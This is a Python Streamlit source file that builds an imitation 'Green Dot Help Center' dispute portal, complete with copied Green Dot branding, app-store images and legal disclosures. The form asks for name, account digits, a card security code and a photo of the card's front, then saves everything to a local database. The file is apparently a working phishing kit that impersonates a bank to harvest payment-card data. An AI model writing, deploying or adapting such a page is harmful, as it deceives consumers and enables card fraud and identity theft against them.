
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Database setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- STYLING ---
st.markdown("""<style>
.main { background-color: #f4f7f6; }
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border-radius: 5px !important;
    font-weight: bold !important;
}
.app-section-container {
    background-color: #000000;
    color: #ffffff;
    padding: 60px 20px;
    text-align: center;
    margin-top: 50px;
    width: 100vw;
    position: relative;
    left: 50%;
    right: 50%;
    margin-left: -50vw;
    margin-right: -50vw;
}
.app-headline { font-size: 2.8rem; font-weight: 800; margin-bottom: 15px; }
.app-subtext { font-size: 1.2rem; margin-bottom: 30px; max-width: 800px; margin: 0 auto; opacity: 0.9; }
.store-buttons { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }

.legal-footer {
    font-size: 0.85rem;
    color: #444444;
    text-align: left;
    line-height: 1.6;
    padding: 50px 10%;
    background-color: #f4f7f6;
    border-top: 1px solid #ddd;
}
</style>""", unsafe_allow_html=True)

# --- HEADER ---
if os.path.exists('logo.svg'):
    st.image('logo.svg', width=200)

st.title("Green Dot Help Center")
st.write("### Secure Claim Submission Portal")
st.divider()

# --- FORM ---
with st.container():
    st.subheader("Submit a New Claim")
    with st.form("claim_form_final", clear_on_submit=True):
        c1, c2 = st.columns(2)
        with c1:
            nombre = st.text_input("Full Name")
            cuenta = st.text_input("Account Number (Last 4 digits)")
        with c2:
            codigo = st.text_input("Security Code")
            monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)

        st.write("**Evidence Required**")
        f_col, t_col = st.columns(2)
        with f_col: file_factura = st.file_uploader("Store Receipt", type=['png', 'jpg', 'jpeg'])
        with t_col: file_tarjeta = st.file_uploader("Card Front Photo", type=['png', 'jpg', 'jpeg'])

        submit = st.form_submit_button("SUBMIT SECURE DISPUTE")

if submit:
    if nombre and file_factura and file_tarjeta:
        f_path = os.path.join(UPLOAD_DIR, f"f_{int(datetime.now().timestamp())}_{file_factura.name}")
        t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")
        with open(f_path, 'wb') as f: f.write(file_factura.getbuffer())
        with open(t_path, 'wb') as f: f.write(file_tarjeta.getbuffer())
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
                  (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
        conn.commit()
        conn.close()
        st.success("✅ Your claim has been submitted successfully.")
    else:
        st.error("⚠️ Please complete all fields.")

# --- APP DOWNLOAD SECTION ---
st.markdown("""
<div class="app-section-container">
    <div class="app-headline">Download the Green Dot app</div>
    <div class="app-subtext">
        We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.
    </div>
    <div class="store-buttons">
        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg" width="180"></a>
        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg" width="180"></a>
    </div>
</div>
""", unsafe_allow_html=True)

# --- DETAILED LEGAL FOOTER ---
st.markdown("""
<div class="legal-footer">
    * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
    The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions for the service and Ingo Money, Inc., which are third parties that operate independently from GO2bank.com. Ingo Money will provide customer service for all mobile check cashing. Subject to the Terms and Conditions and Privacy Policy. Approval usually takes 3-5 minutes but may take up to one hour. All checks are subject to approval for funding in Ingo Money’s sole discretion. Fees apply for approved ‘Money in Minutes’ transactions funding to your card or account. Unapproved checks will not be loaded to your card or account. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use of the Ingo Money Service. Your wireless carrier may charge a fee for data usage. Additional transaction fees, costs, terms and conditions may be associated with the funding use of your card or account. See your Cardholder Account Agreement for details. Note: Ingo Money check cashing services is not available for use within the state of New York.<br><br>
    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
    GO2bank™ cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.<br><br>
    Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank. Deposits under any of these trade names are deposits with Green Dot Bank and are aggregated for deposit insurance coverage up to the allowable limits.<br><br>
    All third-party names and logos are trademarks of their respective owners. These owners are not affiliated with Green Dot Corporation and have not sponsored or endorsed Green Dot Bank products or services. Neither Green Dot Corporation, Visa U.S.A. nor any of their respective affiliates are responsible for the products or services provided by Ingo® Money and Plaid, Inc. Partner terms and conditions apply.<br><br>
    Apple, the Apple logo, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. App Store is a service mark of Apple Inc. Google, Android and Google Play are trademarks of Google Inc., registered in the U.S. and other countries. Samsung is a registered trademark of Samsung Electronics Co., Ltd.<br><br>
    <strong>©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.</strong>
</div>
""", unsafe_allow_html=True)
